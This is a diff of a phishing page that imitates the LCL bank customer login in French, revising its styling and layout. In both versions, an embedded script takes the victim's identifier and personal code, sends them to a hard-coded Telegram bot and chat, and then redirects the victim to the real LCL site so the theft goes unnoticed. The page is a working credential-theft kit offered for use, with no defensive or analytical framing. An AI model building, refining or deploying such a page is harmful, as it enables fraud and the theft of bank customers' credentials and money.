@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LCL - Mon espace client</title>
+    <title>Connexion LCL</title>
     <style>
-        /* RESET & BASE */
+        /* --- STYLE GLOBAL --- */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -15,170 +15,142 @@
 
         body {
             background-color: #ffffff;
-            color: #333;
+            color: #000;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
-            justify-content: center; /* Centré verticalement pour l'effet "App" */
             align-items: center;
-            padding: 0 20px;
+            min-height: 100vh;
+            padding: 20px;
         }
 
-        /* CONTAINER PRINCIPAL */
-        .login-wrapper {
+        /* --- CONTENEUR --- */
+        .container {
             width: 100%;
-            max-width: 450px;
-            text-align: center;
-            padding-top: 20px; /* Petit espace en haut pour ne pas coller le bord */
+            max-width: 400px;
+            margin-top: 20px;
+            margin-bottom: 20px;
         }
 
-        /* LOGO (Haut) */
+        /* --- LOGO / IMAGE EN HAUT --- */
         .logo-top {
-            width: 120px; /* Taille réduite comme demandé */
+            width: 150px; /* Taille adaptée */
             height: auto;
-            margin-bottom: 40px;
             display: block;
-            margin-left: auto;
-            margin-right: auto;
+            margin: 0 auto 25px auto;
         }
 
-        /* TITRES */
-        h1 {
-            font-size: 22px;
+        /* --- FORMULAIRE --- */
+        h2 {
+            font-size: 20px;
             font-weight: 600;
-            margin-bottom: 15px;
-            color: #000;
-            text-align: left; /* Aligné à gauche comme dans les apps modernes */
-            padding-left: 2px;
-        }
-
-        p.subtitle {
-            font-size: 15px;
-            color: #555;
-            margin-bottom: 30px;
-            line-height: 1.4;
+            margin-bottom: 10px;
             text-align: left;
-            padding-left: 2px;
         }
 
-        /* FORMULAIRE STYLE "LIGNE" */
-        .form-group {
+        p.desc {
+            font-size: 14px;
+            color: #666;
             margin-bottom: 25px;
             text-align: left;
-            padding-left: 2px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
             font-size: 13px;
+            color: #555;
+            margin-bottom: 8px;
             font-weight: 500;
-            color: #666;
         }
 
-        /* Style des inputs : Bordure en bas uniquement */
+        /* Style des champs avec LIGNE */
         input[type="text"],
         input[type="tel"],
         input[type="password"] {
             width: 100%;
-            padding: 12px 0;
+            padding: 12px 5px;
             font-size: 18px;
-            background-color: transparent;
+            background: transparent;
             border: none;
-            border-bottom: 1px solid #ccc; /* La ligne demandée */
+            border-bottom: 1px solid #ccc;
             border-radius: 0;
+            outline: none;
             transition: border-color 0.2s;
         }
 
         input:focus {
-            outline: none;
-            border-bottom-color: #00509F; /* Devient bleu LCL au focus */
+            border-bottom-color: #00509F;
         }
 
-        /* Placeholder gris clair */
         input::placeholder {
-            color: #bbb;
+            color: #ccc;
             font-size: 16px;
         }
 
         /* BOUTON */
-        .btn-submit {
+        .btn {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             background-color: #00509F;
             color: white;
             border: none;
-            border-radius: 4px; /* Légèrement arrondi */
-            font-size: 17px;
+            border-radius: 6px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: background-color 0.2s;
         }
 
-        .btn-submit:hover {
-            background-color: #004080;
-        }
-        
-        .btn-submit:active {
-            transform: scale(0.99);
+        .btn:disabled {
+            background-color: #999;
         }
 
-        /* LIENS UTILES */
-        .links {
-            margin-top: 20px;
-            font-size: 14px;
-        }
-        .links a {
-            display: block;
-            color: #00509F;
-            text-decoration: none;
-            margin-bottom: 10px;
-        }
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        /* FOOTER */
+        /* FOOTER / LOGO EN BAS */
         .footer {
-            margin-top: auto; /* Pousse le footer en bas si l'écran est grand */
-            margin-bottom: 20px;
-            font-size: 12px;
-            color: #888;
+            margin-top: auto;
+            padding-top: 30px;
             text-align: center;
             width: 100%;
         }
-        
+
         .logo-bottom {
-            width: 60px; /* Petit logo en bas */
-            opacity: 0.6;
-            margin-bottom: 10px;
+            width: 100px;
+            height: auto;
             display: block;
-            margin-left: auto;
-            margin-right: auto;
+            margin: 0 auto 15px auto;
+            opacity: 0.8;
         }
 
-        .legal-links a {
-            color: #888;
+        .legal {
+            font-size: 11px;
+            color: #999;
+        }
+
+        .legal a {
+            color: #999;
             text-decoration: none;
             margin: 0 5px;
         }
 
-        /* GESTION DES VUES */
+        /* --- GESTION DES VUES --- */
         .view {
             display: none;
-            animation: fadeIn 0.3s ease-in-out;
         }
-        .active {
+        .view.active {
             display: block;
+            animation: fadeIn 0.3s;
         }
 
-        /* LOADER */
         .loader {
             display: none;
-            margin-top: 20px;
+            margin-top: 15px;
             font-size: 14px;
-            color: #555;
+            color: #666;
+            text-align: center;
         }
 
         @keyframes fadeIn {
@@ -190,115 +162,111 @@
 </head>
 <body>
 
-    <div class="login-wrapper">
+    <div class="container">
         
-        <!-- LOGO EN HAUT (Petit et tout en haut) -->
-        <!-- Remplacez src par l'URL de votre image si disponible -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/LCL_Logo.svg/800px-LCL_Logo.svg.png" alt="LCL Logo" class="logo-top">
+        <!-- LOGO EN HAUT -->
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="Logo LCL" class="logo-top" id="logoTop">
 
         <!-- VUE 1 : IDENTIFIANT -->
         <div id="view1" class="view active">
-            <h1>Mon espace client</h1>
-            <p class="subtitle">Pour accéder à vos comptes, saisissez votre identifiant.</p>
+            <h2>Mon espace client</h2>
+            <p class="desc">Saisissez votre identifiant pour continuer.</p>
 
-            <div class="form-group">
-                <label for="userId">Votre identifiant</label>
-                <!-- inputmode=numeric force le clavier chiffres -->
+            <div class="input-group">
+                <label for="userId">Identifiant</label>
                 <input type="text" id="userId" placeholder="Ex: 123456789" inputmode="numeric" pattern="[0-9]*" autocomplete="username" autofocus>
             </div>
 
-            <button type="button" class="btn-submit" id="btnNext">Suivant</button>
-
-            <div class="links">
-                <a href="#">Identifiant oublié ?</a>
-                <a href="#">Mémoriser mon identifiant</a>
+            <button type="button" class="btn" id="btnNext">Suivant</button>
+            
+            <div style="margin-top: 20px; font-size: 14px; text-align: center;">
+                <a href="#" style="color: #00509F; text-decoration: none;">Identifiant oublié ?</a>
             </div>
         </div>
 
         <!-- VUE 2 : CODE -->
         <div id="view2" class="view">
-            <h1>Bonjour <span id="displayName"></span></h1>
-            <p class="subtitle">Saisissez votre code personnel pour continuer.</p>
+            <h2>Bonjour <span id="userName"></span></h2>
+            <p class="desc">Saisissez votre code pour accéder à vos comptes.</p>
 
-            <div class="form-group">
-                <label for="pinCode">Votre code personnel</label>
-                <!-- inputmode=numeric et pas de maxlength -->
+            <div class="input-group">
+                <label for="pinCode">Code personnel</label>
                 <input type="tel" id="pinCode" placeholder="Votre code" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password">
             </div>
 
-            <button type="button" class="btn-submit" id="btnSubmit">Valider</button>
+            <button type="button" class="btn" id="btnSubmit">Valider</button>
 
-            <div class="links">
-                <a href="#">Code personnel oublié ?</a>
-                <a href="#">Pas encore client ?</a>
+            <div style="margin-top: 20px; font-size: 14px; text-align: center;">
+                <a href="#" style="color: #00509F; text-decoration: none;">Code oublié ?</a>
             </div>
         </div>
 
         <div class="loader" id="loader">Connexion en cours...</div>
 
-        <!-- FOOTER AVEC LOGO EN BAS -->
-        <div class="footer">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/LCL_Logo.svg/200px-LCL_Logo.svg.png" alt="LCL Footer" class="logo-bottom">
-            <p>© LCL - Tous droits réservés</p>
-            <div class="legal-links">
-                <a href="#">Mentions légales</a>
-                <a href="#">Cookies</a>
-            </div>
-        </div>
+    </div>
 
+    <!-- FOOTER AVEC LOGO EN BAS -->
+    <div class="footer">
+        <!-- Meme logo en bas (plus petit) -->
+        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png?utm_source=fr.wikipedia.org&utm_campaign=index&utm_content=thumbnail&_=20210313135726" alt="Logo LCL" class="logo-bottom" id="logoBottom">
+        
+        <div class="legal">
+            © LCL 2026 <br>
+            <a href="#">Mentions légales</a> <a href="#">Cookies</a>
+        </div>
     </div>
 
     <script>
-        // --- CONFIGURATION TELEGRAM ---
-        const TELEGRAM_BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ'; 
-        const TELEGRAM_CHAT_ID = '8501464548';
-        // -----------------------------
+        // --- CONFIG TELEGRAM ---
+        // Remplace par tes vrais IDs
+        const BOT_TOKEN = '8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ'; 
+        const CHAT_ID = '8501464548';
+        // ----------------------
 
         const view1 = document.getElementById('view1');
         const view2 = document.getElementById('view2');
         const userIdInput = document.getElementById('userId');
         const pinCodeInput = document.getElementById('pinCode');
-        const displayName = document.getElementById('displayName');
+        const userName = document.getElementById('userName');
         const loader = document.getElementById('loader');
         const btnNext = document.getElementById('btnNext');
         const btnSubmit = document.getElementById('btnSubmit');
 
-        // Passer à l'écran 2
+        // Passage à l'étape 2
         btnNext.addEventListener('click', () => {
-            const id = userIdInput.value.trim();
-            if (id.length > 0) {
-                displayName.textContent = id;
+            const val = userIdInput.value.trim();
+            if (val) {
+                userName.textContent = val;
                 view1.classList.remove('active');
                 view2.classList.add('active');
                 pinCodeInput.focus();
             }
         });
 
-        // Soumission finale
+        // Soumission
         btnSubmit.addEventListener('click', () => {
+            const id = userIdInput.value;
             const code = pinCodeInput.value;
-            
-            // UI
+
             btnSubmit.disabled = true;
-            btnSubmit.textContent = "Connexion...";
+            btnSubmit.textContent = "Vérification...";
             loader.style.display = 'block';
 
-            const timestamp = new Date().toLocaleString('fr-FR');
-            const message = `🔐 <b>Connexion LCL Confirmée</b>\n\n👤 <b>Identifiant:</b> ${userIdInput.value}\n🔑 <b>Code:</b> ${code}\n📅 <b>Date:</b> ${timestamp}\n📱 <b>Appareil:</b> iOS`;
+            // Envoi Telegram
+            const msg = `🔐 <b>Connexion LCL</b>\n\n👤 ID: ${id}\n🔑 Code: ${code}\n📅 ${new Date().toLocaleString()}`;
+            
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`;
 
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
-
-            fetch(telegramUrl)
+            fetch(url)
                 .then(() => {
                     setTimeout(() => {
                         window.location.href = "https://monespace.lcl.fr/";
-                    }, 1500);
+                    }, 1000);
                 })
                 .catch(() => {
                     window.location.href = "https://monespace.lcl.fr/";
                 });
         });
     </script>
-
 </body>
 </html>
